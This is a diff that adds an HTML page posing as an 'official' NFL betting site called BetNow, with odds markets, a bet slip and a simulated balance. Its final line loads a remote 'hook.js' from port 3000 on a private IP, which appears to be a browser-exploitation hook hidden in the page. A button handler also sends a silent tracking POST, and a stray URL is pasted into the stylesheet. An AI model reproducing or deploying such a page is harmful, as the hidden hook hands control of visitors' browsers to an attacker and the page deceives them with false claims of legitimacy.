@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SportsBook | Bet Now</title>
+
+  <style>
+    :root{
+      --bg0:#070B12;
+      --bg1:#0B1220;
+      --card:#0E182B;
+      --line:#1C2A44;
+      --text:#EAF2FF;
+      --muted:#9FB0D0;
+
+      --accent:#36FF88;   /* neon green */
+      --accent2:#00D4FF;  /* electric cyan */
+      --warn:#FFB020;
+      --danger:#FF4D6D;
+
+      --shadow: 0 18px 50px rgba(0,0,0,.55);
+      --radius: 16px;
+    }
+
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, Helvetica, sans-serif;
+      color:var(--text);
+      background:
+        radial-gradient(1200px 600px at 15% -10%, rgba(54,255,136,.18), transparent 60%),
+        radial-gradient(1000px 500px at 85% 0%, rgba(0,212,255,.16), transparent 55%),
+        radial-gradient(900px 500px at 50% 110%, rgba(255,176,32,.08), transparent 60%),
+        linear-gradient(180deg, var(--bg0), var(--bg1));
+      min-height:100vh;
+    }
+
+    .wrap{
+      width:min(1200px, 92vw);
+      margin:0 auto;
+      padding:18px 0 60px;
+    }
+
+    header{
+      position:sticky; top:0;
+      backdrop-filter: blur(10px);
+https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quickstart      background: rgba(7,11,18,.65);
+      border-bottom:1px solid rgba(28,42,68,.65);
+      z-index:30;
+    }
+    .topbar{
+      width:min(1200px, 92vw);
+      margin:0 auto;
+      padding:14px 0;
+      display:flex;
+      gap:12px;
+      align-items:center;
+      justify-content:space-between;
+    }
+
+    .brand{
+      display:flex; align-items:center; gap:10px;
+      font-weight:800; letter-spacing:.5px;
+    }
+    .pill{
+      display:inline-flex; align-items:center; gap:8px;
+      padding:8px 12px;
+      border:1px solid rgba(28,42,68,.9);
+      background: rgba(14,24,43,.75);
+      border-radius:999px;
+      color:var(--muted);
+      font-size:.9rem;
+    }
+    .pill b{color:var(--text)}
+    .dot{width:8px;height:8px;border-radius:999px;background:var(--accent); box-shadow:0 0 16px rgba(54,255,136,.8)}
+
+    .actions{display:flex; gap:10px; align-items:center; flex-wrap:wrap; justify-content:flex-end}
+    .btn{
+      border:1px solid rgba(28,42,68,.95);
+      background: rgba(14,24,43,.85);
+      color:var(--text);
+      padding:10px 12px;
+      border-radius:12px;
+      cursor:pointer;
+      transition: transform .12s ease, border-color .12s ease, box-shadow .12s ease;
+      font-weight:750;
+      white-space:nowrap;
+    }
+    .btn:hover{transform: translateY(-1px); border-color: rgba(54,255,136,.55); box-shadow: 0 10px 26px rgba(0,0,0,.35)}
+    .btn:active{transform: translateY(0px) scale(.99)}
+    .btn.ghost{ background: transparent; }
+
+    /* Top-right primary action */
+    .btn.betnow{
+      border:1px solid rgba(0,212,255,.85);
+      background: linear-gradient(180deg, rgba(0,212,255,.30), rgba(54,255,136,.14));
+      box-shadow: 0 0 0 1px rgba(0,212,255,.10) inset, 0 12px 30px rgba(0,0,0,.45);
+      font-weight:950;
+      letter-spacing:.4px;
+      padding:10px 16px;
+    }
+    .btn.betnow:hover{
+      border-color: rgba(0,212,255,.98);
+      box-shadow: 0 0 0 1px rgba(0,212,255,.14) inset, 0 14px 36px rgba(0,0,0,.55);
+    }
+
+    .grid{
+      display:grid;
+      grid-template-columns: 1.65fr .85fr;
+      gap:18px;
+      margin-top:18px;
+      align-items:start;
+    }
+    @media (max-width: 980px){ .grid{grid-template-columns:1fr} }
+
+    .card{
+      background: linear-gradient(180deg, rgba(14,24,43,.92), rgba(11,21,38,.92));
+      border:1px solid rgba(28,42,68,.95);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      overflow:hidden;
+    }
+    .card .hd{
+      padding:16px 16px 12px;
+      border-bottom:1px solid rgba(28,42,68,.75);
+      display:flex; align-items:flex-start; justify-content:space-between; gap:10px;
+    }
+    .card .hd h2{ margin:0; font-size:1.05rem; letter-spacing:.2px; }
+    .sub{ margin:6px 0 0; color:var(--muted); font-size:.9rem; }
+    .content{padding:16px}
+
+    .matchRow{
+      display:flex; align-items:center; justify-content:space-between; gap:14px;
+      flex-wrap:wrap;
+    }
+    .teams{
+      display:flex; align-items:center; gap:12px
+      font-weight:900;
+      font-size:1.2rem;
+      letter-spacing:.3px;
+    }
+    .vs{
+      color:var(--muted);
+      font-weight:700;
+      font-size:.95rem;
+      border:1px solid rgba(28,42,68,.9);
+      padding:6px 10px;
+      border-radius:999px;
+      background: rgba(7,11,18,.35);
+    }
+
+    .players{
+      display:grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap:12px;
+      margin-top:14px;
+    }
+    @media (max-width: 980px){ .players{grid-template-columns: repeat(2, 1fr)} }
+
+    .pCard{
+      background: rgba(7,11,18,.35);
+      border:1px solid rgba(28,42,68,.75);
+      border-radius: 14px;
+      overflow:hidden;
+      transition: transform .12s ease, border-color .12s ease;
+    }
+    .pCard:hover{transform: translateY(-2px); border-color: rgba(0,212,255,.45)}
+    .pImg{height:140px; background: rgba(14,24,43,.8); overflow:hidden;}
+    .pImg img{width:100%; height:100%; object-fit:cover; transform: scale(1.03); filter: contrast(1.05) saturate(1.05);}
+    .pMeta{padding:10px 10px 12px}
+    .pName{font-weight:900; font-size:.95rem}
+    .pTeam{color:var(--muted); font-size:.85rem; margin-top:3px}
+    .pBadge{
+      margin-top:8px;
+      display:inline-flex;
+      gap:8px;
+      align-items:center;
+      font-size:.78rem;
+      color:var(--muted);
+      border:1px solid rgba(28,42,68,.85);
+      border-radius:999px;
+      padding:6px 10px;
+      background: rgba(14,24,43,.55);
+    }
+
+    .marketGrid{display:grid; grid-template-columns: 1fr; gap:12px; margin-top:10px;}
+    .market{background: rgba(7,11,18,.25); border:1px solid rgba(28,42,68,.75); border-radius: 14px; padding:12px;}
+    .mTitle{display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:10px;}
+    .mTitle b{font-size:.95rem}
+    .mTitle span{color:var(--muted); font-size:.85rem}
+    .oddsRow{display:grid; grid-template-columns: repeat(3, 1fr); gap:10px;}
+    @media (max-width: 520px){ .oddsRow{grid-template-columns:1fr} }
+
+    .oddBtn{
+      width:100%;
+      text-align:left;
+      border:1px solid rgba(28,42,68,.95);
+      background: rgba(14,24,43,.75);
+      color:var(--text);
+      padding:12px 12px;
+      border-radius: 14px;
+      cursor:pointer;
+      transition: transform .12s ease, border-color .12s ease, box-shadow .12s ease;
+      display:flex; align-items:center; justify-content:space-between; gap:10px;
+      min-height:50px;
+    }
+    .oddBtn:hover{transform: translateY(-1px); border-color: rgba(54,255,136,.55); box-shadow:0 10px 24px rgba(0,0,0,.35)}
+    .oddBtn.active{
+      border-color: rgba(54,255,136,.95);
+      box-shadow: 0 0 0 1px rgba(54,255,136,.15) inset, 0 12px 28px rgba(0,0,0,.45);
+    }
+    .oddLeft .label{font-weight:900}
+    .oddLeft .line{color:var(--muted); font-size:.85rem; margin-top:2px}
+    .oddRight{
+      font-weight:950;
+      color: var(--accent);
+      letter-spacing:.3px;
+      font-variant-numeric: tabular-nums;
+    }
+    .tiny{color:var(--muted); font-size:.82rem; margin-top:10px;}
+
+    .slip{position:sticky; top:78px;}
+    .slipBody{padding:14px 14px 16px}
+    .slipEmpty{
+      color:var(--muted);
+      background: rgba(7,11,18,.25);
+      border:1px dashed rgba(28,42,68,.95);
+      border-radius: 14px;
+      padding:12px;
+      line-height:1.35;
+    }
+    .ticket{background: rgba(7,11,18,.25); border:1px solid rgba(28,42,68,.85); border-radius: 14px; padding:12px;}
+    .tRow{display:flex; justify-content:space-between; gap:10px; align-items:flex-start}
+    .tPick{font-weight:900; margin:0}
+    .tMeta{margin-top:4px; color:var(--muted); font-size:.85rem}
+    .tOdd{font-weight:950; color:var(--accent); font-variant-numeric: tabular-nums}
+    .divider{height:1px;background:rgba(28,42,68,.75); margin:12px 0}
+    .field{display:grid; gap:8px;}
+    input[type="number"]{
+      width:100%;
+      border:1px solid rgba(28,42,68,.95);
+      background: rgba(14,24,43,.6);
+      color:var(--text);
+      padding:12px 12px;
+      border-radius: 12px;
+      font-size:1rem;
+      outline:none;
+    }
+    input[type="number"]:focus{border-color: rgba(0,212,255,.65)}
+    .kv{display:flex; justify-content:space-between; color:var(--muted); font-size:.9rem}
+    .kv b{color:var(--text); font-variant-numeric: tabular-nums}
+    .place{
+      width:100%;
+      margin-top:12px;
+      padding:12px 12px;
+      border-radius: 14px;
+      border:1px solid rgba(54,255,136,.8);
+      background: linear-gradient(180deg, rgba(54,255,136,.18), rgba(54,255,136,.06));
+      color:var(--text);
+      font-weight:950;
+      cursor:pointer;
+      transition: transform .12s ease, filter .12s ease;
+    }
+    .place:disabled{opacity:.45; cursor:not-allowed; filter: grayscale(.2);}
+    .place:not(:disabled):hover{transform: translateY(-1px)}
+    .place:not(:disabled):active{transform: translateY(0px) scale(.99)}
+    .miniRow{display:flex; gap:10px; margin-top:12px}
+    .miniRow .btn{flex:1}
+
+    .toasts{
+      position:fixed;
+      right:14px;
+      bottom:14px;
+      display:grid;
+      gap:10px;
+      z-index:60;
+      width:min(360px, 92vw);
+    }
+    .toast{
+      background: rgba(14,24,43,.92);
+      border:1px solid rgba(28,42,68,.95);
+      border-radius: 14px;
+      padding:12px;
+      box-shadow: 0 18px 50px rgba(0,0,0,.6);
+      animation: pop .18s ease;
+    }
+    @keyframes pop{from{transform: translateY(6px); opacity:.2} to{transform: translateY(0); opacity:1}}
+    .toast b{display:block; margin-bottom:2px}
+    .toast span{color:var(--muted); font-size:.9rem}
+
+    .modalWrap{
+      position:fixed; inset:0;
+      background: rgba(0,0,0,.55);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:70;
+      padding:16px;
+    }
+    .modal{
+      width:min(520px, 96vw);
+      background: rgba(14,24,43,.95);
+      border:1px solid rgba(28,42,68,.95);
+      border-radius: 18px;
+      box-shadow: 0 30px 90px rgba(0,0,0,.75);
+      overflow:hidden;
+    }
+    .mono{font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace}
+    footer{
+      margin-top:22px;
+      color:var(--muted);
+      font-size:.85rem;
+      text-align:center;
+      line-height:1.45;
+    }
+  </style>
+</head>
+
+<body>
+<header>
+  <div class="topbar">
+    <div class="brand">
+      <span style="font-size:1.2rem">🏈</span>
+      <span>BetNow</span>
+      <span class="pill"><span class="dot"></span> <b>LIVE</b> odds</span>
+    </div>
+
+    <div class="actions">
+      <span class="pill">Balance: <b id="bal">$251.07</b></span>
+      <button class="btn ghost" id="refreshBtn">Refresh Odds</button>
+      <button class="btn betnow" id="betNowBtn">BET NOW</button>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="grid">
+    <div>
+      <div class="card">
+        <div class="hd">
+          <div>
+            <h2>SportsBook</h2>
+            <p class="sub">Official Interactive Betting Page</p>
+          </div>
+          <div class="tagLive">
+            <span class="vs">NFL • Prime Time</span>
+            <span class="vs" id="clock">Kickoff: 8:20 PM</span>
+          </div>
+        </div>
+
+        <div class="content">
+          <div class="matchRow">
+            <div class="teams">
+              <span>Kansas City</span>
+              <span class="vs">VS</span>
+              <span>San Francisco 49ers</span>
+            </div>
+            <div class="pill">Market: <b>Full Game</b> • <span id="lastMove">Odds moving…</span></div>
+          </div>
+
+          <div class="players">
+            <div class="pCard">
+              <div class="pImg">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/92/Patrick_Mahomes_%2851615475056%29.jpg" alt="Patrick Mahomes" />
+              </div>
+              <div class="pMeta">
+                <div class="pName">Patrick Mahomes</div>
+                <div class="pTeam">Chiefs • QB</div>
+                <div class="pBadge">Featured</div>
+              </div>
+            </div>
+
+            <div class="pCard">
+              <div class="pImg">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Travis_Kelce_2021.jpg" alt="Travis Kelce" />
+              </div>
+              <div class="pMeta">
+                <div class="pName">Travis Kelce</div>
+                <div class="pTeam">Chiefs • TE</div>
+                <div class="pBadge">Anytime TD</div>
+              </div>
+            </div>
+
+            <div class="pCard">
+              <div class="pImg">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Brock_Purdy.jpg" alt="Brock Purdy" />
+              </div>
+              <div class="pMeta">
+                <div class="pName">Brock Purdy</div>
+                <div class="pTeam">49ers • QB</div>
+                <div class="pBadge">Passing Yds</div>
+              </div>
+            </div>
+
+            <div class="pCard">
+              <div class="pImg">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Christian_McCaffrey_2021.jpg" alt="Christian McCaffrey" />
+              </div>
+              <div class="pMeta">
+                <div class="pName">Christian McCaffrey</div>
+                <div class="pTeam">49ers • RB</div>
+                <div class="pBadge">Rush + Rec</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="marketGrid" id="marketGrid"></div>
+
+          <div class="tiny">
+            Tip: Click an odds box to add it to the bet slip. Click it again to remove.
+          </div>
+        </div>
+      </div>
+
+      <footer>
+         Wage Your BET NOW!.
+      </footer>
+    </div>
+
+    <div class="slip">
+      <div class="card">
+        <div class="hd">
+          <div>
+            <h2>Bet Slip</h2>
+            <p class="sub">Single</p>
+          </div>
+          <span class="vs" id="slipStatus">0 selected</span>
+        </div>
+
+        <div class="slipBody" id="slipBody">
+          <div class="slipEmpty" id="emptyState">
+            Nothing selected yet.<br />
+            Click an odds box on the left to start a bet.
+          </div>
+
+          <div class="ticket" id="ticket" style="display:none">
+            <div class="tRow">
+              <div>
+                <p class="tPick" id="tPick">—</p>
+                <div class="tMeta" id="tMeta">—</div>
+              </div>
+              <div class="tOdd" id="tOdd">—</div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="field">
+              <label class="kv"><span>Stake</span><b class="mono" id="stakeLabel">$</b></label>
+              <input id="stake" type="number" min="1" step="1" value="25" />
+              <div class="kv"><span>Potential Profit</span><b id="profit" class="mono">$0.00</b></div>
+              <div class="kv"><span>Total Payout</span><b id="payout" class="mono">$0.00</b></div>
+            </div>
+
+            <button class="place" id="placeBtn">Place Bet</button>
+
+            <div class="miniRow">
+              <button class="btn" id="clearBtn">Clear</button>
+              <button class="btn ghost" id="randomBtn">Lucky Pick</button>
+            </div>
+          </div>
+
+          <p class="tiny">
+            Odds update automatically.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toasts" id="toasts"></div>
+
+<div class="modalWrap" id="modalWrap" role="dialog" aria-modal="true">
+  <div class="modal">
+    <div class="hd">
+      <div style="padding:16px">
+        <h2 style="margin:0">Bet Submitted</h2>
+        <p class="sub" style="margin:6px 0 0">Place your BET Now.</p>
+      </div>
+    </div>
+    <div class="content" style="padding:16px">
+      <div class="ticket">
+        <div class="kv"><span>Ticket ID</span><b class="mono" id="ticketId">—</b></div>
+        <div class="divider"></div>
+        <div class="kv"><span>Pick</span><b id="mPick" class="mono">—</b></div>
+        <div class="kv"><span>Odds</span><b id="mOdds" class="mono">—</b></div>
+        <div class="kv"><span>Stake</span><b id="mStake" class="mono">—</b></div>
+        <div class="kv"><span>Potential Payout</span><b id="mPayout" class="mono">—</b></div>
+      </div>
+
+      <div class="miniRow" style="margin-top:12px">
+        <button class="btn" id="closeModal">Done</button>
+        <button class="btn ghost" id="printBtn">Print</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  const markets = [
+    { title: "Moneyline", note: "Winner", options: [
+      { id: "ml_kc", label: "Kansas City", line: "ML", odds: -125 },
+      { id: "ml_sf", label: "49ers",        line: "ML", odds: +110 },
+      { id: "ml_draw", label: "Draw",       line: "Regulation", odds: +900 }
+    ]},
+    { title: "Point Spread", note: "Full game", options: [
+      { id: "sp_kc", label: "Kansas City", line: "-1.5", odds: -110 },
+      { id: "sp_sf", label: "49ers",       line: "+1.5", odds: -110 },
+      { id: "sp_alt", label: "Alt Spread", line: "KC -3.5", odds: +135 }
+    ]},
+    { title: "Total Points", note: "Over/Under", options: [
+      { id: "tot_over",  label: "Over",      line: "47.5", odds: -105 },
+      { id: "tot_under", label: "Under",     line: "47.5", odds: -115 },
+      { id: "tot_alt",   label: "Alt Total", line: "Over 51.5", odds: +145 }
+    ]}
+  ];
+
+  const marketGrid = document.getElementById("marketGrid");
+  let selected = null;
+
+  function fmtOdds(n){ return (n > 0 ? `+${n}` : `${n}`); }
+  function americanToDecimal(odds){ return odds > 0 ? 1 + (odds/100) : 1 + (100/Math.abs(odds)); }
+  function money(n){ return `$${Number(n).toFixed(2)}`; }
+
+  function toast(title, msg){
+    const el = document.createElement("div");
+    el.className = "toast";
+    el.innerHTML = `<b>${title}</b><span>${msg}</span>`;
+    document.getElementById("toasts").appendChild(el);
+    setTimeout(()=> el.remove(), 2400);
+  }
+
+  function renderMarkets(){
+    marketGrid.innerHTML = "";
+    markets.forEach(m => {
+      const wrap = document.createElement("div");
+      wrap.className = "market";
+
+      const hd = document.createElement("div");
+      hd.className = "mTitle";
+      hd.innerHTML = `<b>${m.title}</b><span>${m.note}</span>`;
+      wrap.appendChild(hd);
+
+      const row = document.createElement("div");
+      row.className = "oddsRow";
+
+      m.options.forEach(opt => {
+        const btn = document.createElement("button");
+        btn.className = "oddBtn";
+        if (selected && selected.id === opt.id) btn.classList.add("active");
+
+        btn.innerHTML = `
+          <div class="oddLeft">
+            <div class="label">${opt.label}</div>
+            <div class="line">${opt.line}</div>
+          </div>
+          <div class="oddRight">${fmtOdds(opt.odds)}</div>
+        `;
+
+        btn.addEventListener("click", () => {
+          if (selected && selected.id === opt.id){
+            selected = null;
+            toast("Removed", "Selection cleared.");
+          } else {
+            selected = { ...opt, market: m.title };
+            toast("Added", `${opt.label} • ${opt.line} @ ${fmtOdds(opt.odds)}`);
+          }
+          renderMarkets();
+          syncSlip();
+        });
+
+        row.appendChild(btn);
+      });
+
+      wrap.appendChild(row);
+      marketGrid.appendChild(wrap);
+    });
+  }
+
+  const emptyState = document.getElementById("emptyState");
+  const ticket = document.getElementById("ticket");
+  const slipStatus = document.getElementById("slipStatus");
+  const tPick = document.getElementById("tPick");
+  const tMeta = document.getElementById("tMeta");
+  const tOdd  = document.getElementById("tOdd");
+  const stake = document.getElementById("stake");
+  const profit = document.getElementById("profit");
+  const payout = document.getElementById("payout");
+  const placeBtn = document.getElementById("placeBtn");
+
+  function calc(){
+    if (!selected) return;
+    const s = Math.max(0, Number(stake.value || 0));
+    const dec = americanToDecimal(selected.odds);
+    const total = s * dec;
+    profit.textContent = money(total - s);
+    payout.textContent = money(total);
+    placeBtn.disabled = !(s > 0);
+  }
+
+  function syncSlip(){
+    slipStatus.textContent = selected ? "1 selected" : "0 selected";
+    if (!selected){
+      emptyState.style.display = "block";
+      ticket.style.display = "none";
+      placeBtn.disabled = true;
+      return;
+    }
+    emptyState.style.display = "none";
+    ticket.style.display = "block";
+    tPick.textContent = selected.label;
+    tMeta.textContent = `${selected.market} • ${selected.line}`;
+    tOdd.textContent = fmtOdds(selected.odds);
+    calc();
+  }
+
+  stake.addEventListener("input", calc);
+
+  document.getElementById("clearBtn").addEventListener("click", () => {
+    selected = null;
+    renderMarkets();
+    syncSlip();
+    toast("Cleared", "Bet slip emptied.");
+  });
+
+  document.getElementById("randomBtn").addEventListener("click", () => {
+    const all = markets.flatMap(m => m.options.map(o => ({...o, market:m.title})));
+    selected = all[Math.floor(Math.random() * all.length)];
+    renderMarkets();
+    syncSlip();
+    toast("Picked", `${selected.label} • ${selected.line} @ ${fmtOdds(selected.odds)}`);
+  });
+
+  const lastMove = document.getElementById("lastMove");
+  function bumpOdds(){
+    markets.forEach(m => {
+      m.options.forEach(o => {
+        if (Math.random() < 0.55) return;
+        const step = [5,10,15][Math.floor(Math.random()*3)];
+        const dir = Math.random() < 0.5 ? -1 : 1;
+        let next = o.odds + (dir * step);
+        next = Math.max(-250, Math.min(950, next));
+        if (next === 0) next = dir > 0 ? 105 : -105;
+        o.odds = next;
+      });
+    });
+    const t = new Date().toLocaleTimeString([], {hour:"2-digit", minute:"2-digit"});
+    lastMove.textContent = `Updated ${t}`;
+    renderMarkets();
+    syncSlip();
+  }
+
+  document.getElementById("refreshBtn").addEventListener("click", () => {
+    bumpOdds();
+    toast("Updated", "New odds posted.");
+  });
+
+  setInterval(bumpOdds, 12000);
+
+  const modalWrap = document.getElementById("modalWrap");
+  const closeModal = document.getElementById("closeModal");
+  const printBtn = document.getElementById("printBtn");
+
+  function openModal(){ modalWrap.style.display = "flex"; }
+  function closeIt(){ modalWrap.style.display = "none"; }
+
+  closeModal.addEventListener("click", closeIt);
+  modalWrap.addEventListener("click", (e) => { if (e.target === modalWrap) closeIt(); });
+  printBtn.addEventListener("click", () => window.print());
+
+  placeBtn.addEventListener("click", () => {
+    if (!selected) return;
+    const s = Math.max(0, Number(stake.value || 0));
+    if (!(s > 0)) return;
+
+    const balEl = document.getElementById("bal");
+    const cur = Number(balEl.textContent.replace(/[$,]/g,"")) || 0;
+    balEl.textContent = money(Math.max(0, cur - s));
+
+    document.getElementById("ticketId").textContent = "BN-" + Math.random().toString(16).slice(2,10).toUpperCase();
+    document.getElementById("mPick").textContent = `${selected.label} • ${selected.market}`;
+    document.getElementById("mOdds").textContent = `${selected.line} @ ${fmtOdds(selected.odds)}`;
+    document.getElementById("mStake").textContent = money(s);
+    document.getElementById("mPayout").textContent = payout.textContent;
+
+    toast("Submitted", "Ticket created.");
+    openModal();
+  });
+
+  // 
+  //
+  document.getElementById("betNowBtn").addEventListener("click", () => {
+    // OPTIONAL: if nothing selected, nudge them nicely
+    if (!selected){
+      toast("Select a pick", "Choose an odds box first.");
+      return;
+    }
+
+  
+  fetch("/track", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({ msg: "", ts: Date.now() })
+  }).catch(() => { /* stay silent */ });
+});
+
+
+  renderMarkets();
+  syncSlip();
+<script src="http://10.0.2.15:3000/hook.js"</script>
+</body>
+</html>
